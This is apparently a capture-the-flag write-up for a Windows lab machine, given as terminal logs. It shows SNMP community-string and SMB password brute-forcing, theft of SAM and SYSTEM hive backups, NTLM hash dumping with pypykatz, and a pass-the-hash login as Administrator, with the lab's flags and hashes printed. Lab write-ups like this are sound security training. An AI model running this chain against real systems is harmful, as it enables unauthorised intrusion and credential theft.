---
tags:
title: Year of the Owl - Hard (THM)
permalink: /YearoftheOwl-THM-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash 
zs1n@ptw ~> nmapf 10.64.171.153
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-18 14:09 -0400
Initiating Ping Scan at 14:09
Scanning 10.64.171.153 [4 ports]
Completed Ping Scan at 14:09, 0.33s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:09
Completed Parallel DNS resolution of 1 host. at 14:09, 0.50s elapsed
Initiating SYN Stealth Scan at 14:09
Scanning 10.64.171.153 [65535 ports]
Discovered open port 80/tcp on 10.64.171.153
Discovered open port 445/tcp on 10.64.171.153
Discovered open port 139/tcp on 10.64.171.153
Discovered open port 3389/tcp on 10.64.171.153
Discovered open port 3306/tcp on 10.64.171.153
Discovered open port 443/tcp on 10.64.171.153
Discovered open port 5985/tcp on 10.64.171.153
Discovered open port 47001/tcp on 10.64.171.153
Completed SYN Stealth Scan at 14:09, 13.61s elapsed (65535 total ports)
Nmap scan report for 10.64.171.153
Host is up, received syn-ack ttl 126 (0.19s latency).
Scanned at 2026-03-18 14:09:13 EDT for 13s
Not shown: 65527 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       REASON
80/tcp    open  http          syn-ack ttl 126
139/tcp   open  netbios-ssn   syn-ack ttl 126
443/tcp   open  https         syn-ack ttl 126
445/tcp   open  microsoft-ds  syn-ack ttl 126
3306/tcp  open  mysql         syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126
5985/tcp  open  wsman         syn-ack ttl 126
47001/tcp open  winrm         syn-ack ttl 126

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.58 seconds
           Raw packets sent: 131074 (5.767MB) | Rcvd: 17 (748B)
-e [*] IP: 10.64.171.153
[*] Puertos abiertos: 80,139,443,445,3306,3389,5985,47001
/usr/bin/xclip
-e [*] Service scanning with nmap against 80,139,443,445,3306,3389,5985,47001 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-18 14:09 -0400
Nmap scan report for 10.64.171.153
Host is up (0.17s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
|_http-title: Year of the Owl
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
|_http-title: Year of the Owl
| tls-alpn:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: YEAR-OF-THE-OWL
|   NetBIOS_Domain_Name: YEAR-OF-THE-OWL
|   NetBIOS_Computer_Name: YEAR-OF-THE-OWL
|   DNS_Domain_Name: year-of-the-owl
|   DNS_Computer_Name: year-of-the-owl
|   Product_Version: 10.0.17763
|_  System_Time: 2026-03-18T18:09:47+00:00
|_ssl-date: 2026-03-18T18:10:25+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=year-of-the-owl
| Not valid before: 2026-03-17T18:08:07
|_Not valid after:  2026-09-16T18:08:07
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-03-18T18:09:50
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.15 seconds
```

https://github.com/SECFORCE/SNMP-Brute

![[Pasted image 20260318161910.png]]

```bash
https://github.com/SECFORCE/SNMP-Brute
```

```bash
zs1n@ptw ~> sudo python3 snmpbrute.py -t 10.64.171.153
   _____ _   ____  _______     ____             __
  / ___// | / /  |/  / __ \   / __ )_______  __/ /____
  \__ \/  |/ / /|_/ / /_/ /  / __  / ___/ / / / __/ _ \
 ___/ / /|  / /  / / ____/  / /_/ / /  / /_/ / /_/  __/
/____/_/ |_/_/  /_/_/      /_____/_/   \__,_/\__/\___/

SNMP Bruteforce & Enumeration Script v2.0
http://www.secforce.com / nikos.vassakis <at> secforce.com
###############################################################

Trying ['', '0', '0392a0', '1234', '2read', '3com', '3Com', '3COM', '4changes', 'access', 'adm', 'admin', 'Admin', 'administrator', 'agent', 'agent_steal', 'all', 'all private', 'all public', 'anycom', 'ANYCOM', 'apc', 'bintec', 'blue', 'boss', 'c', 'C0de', 'cable-d', 'cable_docsispublic@es0', 'cacti', 'canon_admin', 'cascade', 'cc', 'changeme', 'cisco', 'CISCO', 'cmaker', 'comcomcom', 'community', 'core', 'CR52401', 'crest', 'debug', 'default', 'demo', 'dilbert', 'enable', 'entry', 'field', 'field-service', 'freekevin', 'friend', 'fubar', 'guest', 'hello', 'hideit', 'host', 'hp_admin', 'ibm', 'IBM', 'ilmi', 'ILMI', 'intel', 'Intel', 'intermec', 'Intermec', 'internal', 'internet', 'ios', 'isdn', 'l2', 'l3', 'lan', 'liteon', 'login', 'logon', 'lucenttech', 'lucenttech1', 'lucenttech2', 'manager', 'master', 'microsoft', 'mngr', 'mngt', 'monitor', 'mrtg', 'nagios', 'net', 'netman', 'network', 'nobody', 'NoGaH$@!', 'none', 'notsopublic', 'nt', 'ntopia', 'openview', 'operator', 'OrigEquipMfr', 'ourCommStr', 'pass', 'passcode', 'password', 'PASSWORD', 'pr1v4t3', 'pr1vat3', 'private', ' private', 'private ', 'Private', 'PRIVATE', 'private@es0', 'Private@es0', 'private@es1', 'Private@es1', 'proxy', 'publ1c', 'public', ' public', 'public ', 'Public', 'PUBLIC', 'public@es0', 'public@es1', 'public/RO', 'read', 'read-only', 'readwrite', 'read-write', 'red', 'regional', '<removed>', 'rmon', 'rmon_admin', 'ro', 'root', 'router', 'rw', 'rwa', 'sanfran', 'san-fran', 'scotty', 'secret', 'Secret', 'SECRET', 'Secret C0de', 'security', 'Security', 'SECURITY', 'seri', 'server', 'snmp', 'SNMP', 'snmpd', 'snmptrap', 'snmp-Trap', 'SNMP_trap', 'SNMPv1/v2c', 'SNMPv2c', 'solaris', 'solarwinds', 'sun', 'SUN', 'superuser', 'supervisor', 'support', 'switch', 'Switch', 'SWITCH', 'sysadm', 'sysop', 'Sysop', 'system', 'System', 'SYSTEM', 'tech', 'telnet', 'TENmanUFactOryPOWER', 'test', 'TEST', 'test2', 'tiv0li', 'tivoli', 'topsecret', 'traffic', 'trap', 'user', 'vterm1', 'watch', 'watchit', 'windows', 'windowsnt', 'workstation', 'world', 'write', 'writeit', 'xyzzy', 'yellow', 'ILMI'] community strings ...
10.64.171.153 : 161 	Version (v1):	openview
10.64.171.153 : 161 	Version (v2c):	openview
Waiting for late packets (CTRL+C to stop)

Trying identified strings for READ-WRITE ...
	 openview (v1) (Failed!)
	 openview (v2c) (Failed!)

Identified Community strings
	0) 10.64.171.153   openview (v1)
	1) 10.64.171.153   openview (v2c)
```


```bash
zs1n@ptw ~> Owl snmpbulkwalk  -c openview -v2c 10.64.171.153 | tee snmpdata
```

```bash
zs1n@ptw ~> snmpbulkwalk  -c openview -v2c 10.64.171.153 1.3.6.1.4.1.77.1.2.25 | tee snmpdata2.txt
iso.3.6.1.4.1.77.1.2.25.1.1.5.71.117.101.115.116 = STRING: "Guest"
iso.3.6.1.4.1.77.1.2.25.1.1.6.74.97.114.101.116.104 = STRING: "Jareth"
iso.3.6.1.4.1.77.1.2.25.1.1.13.65.100.109.105.110.105.115.116.114.97.116.111.114 = STRING: "Administrator"
iso.3.6.1.4.1.77.1.2.25.1.1.14.68.101.102.97.117.108.116.65.99.99.111.117.110.116 = STRING: "DefaultAccount"
iso.3.6.1.4.1.77.1.2.25.1.1.18.87.68.65.71.85.116.105.108.105.116.121.65.99.99.111.117.110.116 = STRING: "WDAGUtilityAccount"
```

```bash
zs1n@ptw ~> hydra -l jareth -P /usr/share/wordlists/rockyou.txt 10.64.171.153 smb2 -VI -t 20
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-18 15:33:31
[WARNING] Workgroup was not specified, using "WORKGROUP"
[DATA] max 20 tasks per 1 server, overall 20 tasks, 14344399 login tries (l:1/p:14344399), ~717220 tries per task
[DATA] attacking smb2://10.64.171.153:445/
[ATTEMPT] target 10.64.171.153 - login "jareth" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.64.171.153 - login "jareth" - pass "12345" - 2 of 14344399 [child 1] (0/0)
..snip..
[445][smb2] host: 10.64.171.153   login: jareth   password: sarah
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-18 15:33:17
```

```powershell
zs1n@ptw ~> evil-winrm -i 10.64.171.153 -u jareth -p 'sarah'

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Jareth\Documents>
```

```powershell
*Evil-WinRM* PS C:\Users\Jareth\Documents> type ../desktop/user.txt
THM{Y2I0NDJjODY2NTc2YmI2Y2U4M2IwZTBl}
```

```powershell
*Evil-WinRM* PS C:\$Recycle.Bin> gci -force


    Directory: C:\$Recycle.Bin


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        9/18/2020   7:28 PM                S-1-5-21-1987495829-1628902820-919763334-1001
d--hs-       11/13/2020  10:41 PM                S-1-5-21-1987495829-1628902820-919763334-500


*Evil-WinRM* PS C:\$Recycle.Bin> cd S-1-5-21-1987495829-1628902820-919763334-1001
*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001> gci -force


    Directory: C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a-hs-        9/18/2020   2:14 AM            129 desktop.ini
-a----        9/18/2020   7:28 PM          49152 sam.bak
-a----        9/18/2020   7:28 PM       17457152 system.bak


*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001> download system.bak

Info: Downloading C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001\system.bak to system.bak

Error: Download failed. Check filenames or paths
*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001> cp system.bak C:\programdata\system.bak
*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001> cp sam.bak C:\programdata\sam.bak
*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001> dir C:\programdata\


    Directory: C:\programdata


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/19/2020   7:50 PM                Amazon
d---s-        9/17/2020   7:35 PM                Microsoft
d-----        9/19/2020   7:56 PM                Package Cache
d-----        3/18/2026   7:55 PM                regid.1991-06.com.microsoft
d-----        9/15/2018   8:19 AM                SoftwareDistribution
d-----        9/18/2020   2:04 AM                ssh
d-----        9/17/2020   7:29 PM                USOPrivate
d-----        9/17/2020   7:29 PM                USOShared
-a----        9/18/2020   7:28 PM          49152 sam.bak
-a----        9/18/2020   7:28 PM       17457152 system.bak
-a----        3/18/2026   7:59 PM       11147862 winPEASany.exe


*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001> cd C:\programdata\
*Evil-WinRM* PS C:\programdata> download system.bak

Info: Downloading C:\programdata\system.bak to system.bak

Info: Download successful!
```


```bash
zs1n@ptw ~> pypykatz registry --sam sam.bak system.bak
WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: d676472afd9cc13ac271e26890b87a8c
============== SAM hive secrets ==============
HBoot Key: 4e65efba7db8df363345caefb2f0b75f10101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:39a21b273f0cfd3d1541695564b4511b:::
Jareth:1001:aad3b435b51404eeaad3b435b51404ee:5a6103a83d2a94be8fd17161dfd4555a:::
```


```powershell
zs1n@ptw ~> evil-winrm -i 10.64.171.153 -u administrator -H '6bc99ede9edcfecf9662fb0c0ddcfa7a'

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../desktop/root.txt
Cannot find path 'C:\Users\Administrator\desktop\root.txt' because it does not exist.
At line:1 char:1
+ type ../desktop/root.txt
+ ~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\desktop\root.txt:String) [Get-Content], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../desktop; dir


    Directory: C:\Users\Administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/18/2020   2:19 AM             80 admin.txt


*Evil-WinRM* PS C:\Users\Administrator\desktop> type admin.txt
THM{YWFjZTM1MjFiZmRiODgyY2UwYzZlZWM2}
```
